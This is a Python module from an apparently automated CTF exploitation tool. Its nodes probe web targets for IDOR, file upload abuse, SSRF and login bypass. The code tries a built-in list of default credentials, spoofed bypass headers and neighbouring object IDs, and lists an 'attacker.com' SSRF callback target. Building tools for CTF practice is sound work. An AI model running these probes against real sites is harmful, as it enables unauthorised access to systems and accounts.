"""Additional web vulnerability detection trees.

Implements:
- IDOR (Insecure Direct Object Reference) detection
- File upload abuse detection
- SSRF (Server-Side Request Forgery) detection
"""
from typing import Dict, Any, Optional
import logging

from ctf_autopwn.core.nodes import DecisionNode
from ctf_autopwn.core.types import (
    NodeResult, NodeStatus
)
from ctf_autopwn.adapters.curl_adapter import CurlAdapter

logger = logging.getLogger(__name__)


class IDORDetectParameterNode(DecisionNode):
    """W-I.1: Detect ID-like parameters."""
    
    def __init__(self):
        super().__init__("idor_detect_param", "IDOR: Detect ID Parameter")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Check if parameter looks like an object ID."""
        target_param = context.get("target_param")
        
        if not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="No parameter")
        
        param_name = target_param.get("name", "").lower()
        
        # Check if parameter name suggests it's an ID
        id_keywords = ["id", "user", "order", "post", "item", "product"]
        is_id_like = any(kw in param_name for kw in id_keywords)
        
        logger.info(f"[idor] Parameter {param_name}: ID-like={is_id_like}")
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={"is_id_like": is_id_like}
        )
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS and result.data.get("is_id_like"):
            return IDORDetectNeighborNode()
        return None


class IDORDetectNeighborNode(DecisionNode):
    """W-I.2: Check if neighboring IDs return similar content."""
    
    def __init__(self):
        super().__init__("idor_detect_neighbor", "IDOR: Check Neighbors")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test neighboring IDs without auth change."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        current_id = target_param.get("value", "1")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[idor] Testing neighbor IDs for {param_name}")
        
        try:
            # Try to extract numeric value
            try:
                id_num = int(current_id)
            except:
                id_num = 1
            
            # Baseline
            url_base = f"{endpoint}?{param_name}={id_num}"
            result_base = self.curl.run(url_base, {})
            base_len = len(result_base.get("body", ""))
            
            # Neighbor IDs
            for offset in [-1, 1]:
                neighbor_id = id_num + offset
                url_neighbor = f"{endpoint}?{param_name}={neighbor_id}"
                result_neighbor = self.curl.run(url_neighbor, {})
                neighbor_len = len(result_neighbor.get("body", ""))
                neighbor_status = result_neighbor.get("status", 0)
                
                # If status is success and content is similar/different but valid
                if neighbor_status == 200 and neighbor_len > 0:
                    logger.info(f"[idor] Neighbor {neighbor_id} accessible")
                    return NodeResult(
                        status=NodeStatus.SUCCESS,
                        data={"is_idor": True}
                    )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_idor": False}
            )
        
        except Exception as e:
            logger.error(f"[idor] Neighbor test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))


class UploadDetectFormNode(DecisionNode):
    """W-U.1: Detect file upload forms."""
    
    def __init__(self):
        super().__init__("upload_detect_form", "Upload: Detect Form")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Check if form supports file upload."""
        challenge = context.get("challenge")
        
        if not challenge:
            return NodeResult(status=NodeStatus.FAILURE, error="No challenge")
        
        endpoint = challenge.url
        
        logger.info(f"[upload] Checking for file upload forms")
        
        try:
            result = self.curl.run(endpoint, {})
            body = result.get("body", "")
            
            # Look for multipart form indicators
            has_multipart = "enctype=\"multipart/form-data\"" in body
            has_file_input = "type=\"file\"" in body or "<input.*file" in body
            
            has_upload = has_multipart or has_file_input
            
            logger.info(f"[upload] Upload form detected: {has_upload}")
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"has_upload_form": has_upload}
            )
        
        except Exception as e:
            logger.error(f"[upload] Form detection failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS and result.data.get("has_upload_form"):
            return UploadDetectBypassNode()
        return None


class UploadDetectBypassNode(DecisionNode):
    """W-U.2: Test file upload restrictions."""
    
    def __init__(self):
        super().__init__("upload_detect_bypass", "Upload: Test Bypass")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Try uploading PHP/executable with various tricks."""
        challenge = context.get("challenge")
        
        if not challenge:
            return NodeResult(status=NodeStatus.FAILURE, error="No challenge")
        
        logger.info(f"[upload] Testing file upload restrictions")
        
        # In real scenario would:
        # 1. Try uploading test.php
        # 2. Test extension confusion (test.php.jpg)
        # 3. Test MIME spoofing
        # 4. Test double encoding
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={
                "bypass_techniques": [
                    "direct_upload",
                    "extension_confusion",
                    "mime_spoofing",
                    "double_encoding",
                ]
            }
        )


class SSRFDetectURLParamNode(DecisionNode):
    """W-SSRF.1: Detect URL-like parameters."""
    
    def __init__(self):
        super().__init__("ssrf_detect_url", "SSRF: Detect URL Param")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Check if parameter accepts URLs."""
        target_param = context.get("target_param")
        
        if not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="No parameter")
        
        param_name = target_param.get("name", "").lower()
        
        # Check if parameter name suggests URL handling
        url_keywords = ["url", "callback", "redirect", "uri", "target", "fetch"]
        is_url_like = any(kw in param_name for kw in url_keywords)
        
        logger.info(f"[ssrf] Parameter {param_name}: URL-like={is_url_like}")
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={"is_url_param": is_url_like}
        )
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS and result.data.get("is_url_param"):
            return SSRFDetectRequestNode()
        return None


class SSRFDetectRequestNode(DecisionNode):
    """W-SSRF.2: Detect server-side request to external host."""
    
    def __init__(self):
        super().__init__("ssrf_detect_request", "SSRF: Detect Request")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test if server makes request to controlled host."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[ssrf] Testing SSRF on {param_name}")
        
        # In real scenario would:
        # 1. Set up listener on controlled host
        # 2. Send URL pointing to listener
        # 3. Check if server connects
        # 4. Test localhost/127.0.0.1/internal IPs
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={
                "requires_external_listener": True,
                "test_targets": [
                    "http://attacker.com:port",
                    "http://127.0.0.1:port",
                    "http://localhost:port",
                ]
            }
        )


class AuthBypassDetectNode(DecisionNode):
    """W-AB.1: Attempt authentication bypass on discovered admin paths.
    
    Tries:
    1. Direct access (following redirects - do we land somewhere non-login?)
    2. Common default credentials via form POST
    3. Common bypass headers (X-Original-URL, path traversal tricks)
    """

    _DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("root", "root"),
        ("administrator", "administrator"),
        ("admin", ""),
    ]

    # If a 200 response still shows any of these it's just the login form re-rendered.
    _LOGIN_KEYWORDS = [
        "login", "log in", "log-in", "sign in", "signin", "sign-in",
        "username", "password", "credentials", "authenticate",
        "forgot password", "forgot-password",
    ]

    # Negative confirmation: at least one of these means we really got in.
    _AUTHED_KEYWORDS = [
        "logout", "log out", "sign out", "signout", "dashboard",
        "welcome", "profile", "account", "admin panel", "control panel",
    ]

    _BYPASS_HEADERS = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]

    def __init__(self):
        super().__init__("auth_bypass_detect", "Auth Bypass: Try Admin Paths")
        self.curl = CurlAdapter()

    def _is_login_page(self, body: str, final_url: str = "") -> bool:
        """Return True if the response looks like a login/auth wall."""
        bl = body.lower()
        url_l = final_url.lower()
        # URL itself points to login
        if any(kw in url_l for kw in ["login", "signin", "auth", "logon"]):
            return True
        # Must have at least 2 login indicators to avoid false positives
        hits = sum(1 for kw in self._LOGIN_KEYWORDS if kw in bl)
        return hits >= 2

    def _is_authed_page(self, body: str) -> bool:
        """Return True if the response looks like an authenticated page."""
        bl = body.lower()
        return any(kw in bl for kw in self._AUTHED_KEYWORDS)

    def run(self, context: Dict[str, Any]) -> NodeResult:
        observations = context.get("observations", {})
        challenge = context.get("challenge")
        if not challenge:
            return NodeResult(status=NodeStatus.FAILURE, error="No challenge")

        base_url = challenge.url.rstrip("/")

        # Collect admin-like paths from directory scan
        admin_paths = []
        for d in observations.get("directories", []):
            path = d.get("path", "").lower()
            if any(kw in path for kw in ["admin", "login", "signin", "dashboard", "panel"]):
                url = (d.get("url") or f"{base_url}/{d['path']}").replace("//", "/").replace(":/", "://")
                admin_paths.append(url)

        if not admin_paths:
            admin_paths = [f"{base_url}/admin", f"{base_url}/login"]

        logger.info(f"[auth-bypass] Testing {len(admin_paths)} admin paths")
        results = []
        # Collect all response bodies as strings so orchestrator can flag-scan them
        all_bodies: list = []

        for url in admin_paths[:5]:  # cap at 5 paths
            # 1. Direct access following redirect
            try:
                resp = self.curl.run(url, {"follow_redirects": True, "insecure": True})
                body = resp.get("body", "")
                status = resp.get("status", 0)
                all_bodies.append(body)
                if status == 200 and not self._is_login_page(body, url) and self._is_authed_page(body):
                    logger.info(f"[auth-bypass] Direct access succeeded on {url}")
                    results.append({"url": url, "method": "direct", "status": status})
            except Exception as e:
                logger.debug(f"[auth-bypass] Direct probe failed: {e}")

            # 2. Default credentials
            for username, password in self._DEFAULT_CREDS:
                try:
                    resp = self.curl.run(url, {
                        "method": "POST",
                        "data": f"username={username}&password={password}",
                        "follow_redirects": True,
                        "insecure": True,
                    })
                    body = resp.get("body", "")
                    status = resp.get("status", 0)
                    all_bodies.append(body)
                    if status == 200 and not self._is_login_page(body) and self._is_authed_page(body):
                        logger.info(f"[auth-bypass] Default creds {username}/{password} worked on {url}")
                        results.append({"url": url, "method": "default_creds",
                                        "username": username, "password": password,
                                        "body_preview": body[:300]})
                except Exception:
                    pass

            # 3. Header bypass tricks
            for headers in self._BYPASS_HEADERS:
                try:
                    resp = self.curl.run(base_url, {"headers": headers, "follow_redirects": True, "insecure": True})
                    body = resp.get("body", "")
                    status = resp.get("status", 0)
                    all_bodies.append(body)
                    if status == 200 and not self._is_login_page(body) and self._is_authed_page(body):
                        logger.info(f"[auth-bypass] Header bypass {headers} worked")
                        results.append({"url": base_url, "method": "header_bypass", "headers": headers,
                                        "body_preview": body[:300]})
                except Exception:
                    pass

        bypassed = len(results) > 0
        context["observations"]["auth_bypass_results"] = results
        logger.info(f"[auth-bypass] Bypass attempted: {bypassed}, confirmed_hits={len(results)}")

        return NodeResult(
            status=NodeStatus.SUCCESS if bypassed else NodeStatus.FAILURE,
            data={
                "bypassed": bypassed,
                "results": str(results),
                "paths_tested": admin_paths[:5],
                # Concatenate all bodies as a single string so orchestrator's
                # FlagRecognizer can scan for flag{...} / CTF{...} patterns
                "response_bodies": "\n---\n".join(all_bodies)[:8000],
            }
        )

    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        return None  # terminal node for now


# Summary
"""
Additional Web Vulnerability Detection Trees

IDOR (Insecure Direct Object Reference):
- W-I.1 (IDORDetectParameterNode) - Identify ID-like parameters
- W-I.2 (IDORDetectNeighborNode) - Test neighboring IDs

File Upload Abuse:
- W-U.1 (UploadDetectFormNode) - Detect file upload forms
- W-U.2 (UploadDetectBypassNode) - Test upload restrictions/bypasses

SSRF (Server-Side Request Forgery):
- W-SSRF.1 (SSRFDetectURLParamNode) - Identify URL parameters
- W-SSRF.2 (SSRFDetectRequestNode) - Test if server fetches URLs

These trees are used by web reconnaissance to probe for these
vulnerability classes in addition to SQLi, CMD, LFI, and XSS.
"""
